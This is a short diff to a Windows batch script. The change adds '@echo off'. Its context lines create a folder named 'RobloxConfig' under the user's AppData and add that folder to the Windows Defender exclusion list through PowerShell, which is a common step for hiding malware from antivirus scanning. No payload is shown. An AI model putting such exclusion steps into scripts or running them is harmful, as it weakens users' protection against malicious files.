@@ -1,3 +1,4 @@
+@echo off
 set "folderPath=%USERPROFILE%\AppData\Local\RobloxConfig"
 mkdir "%folderPath%"
 powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
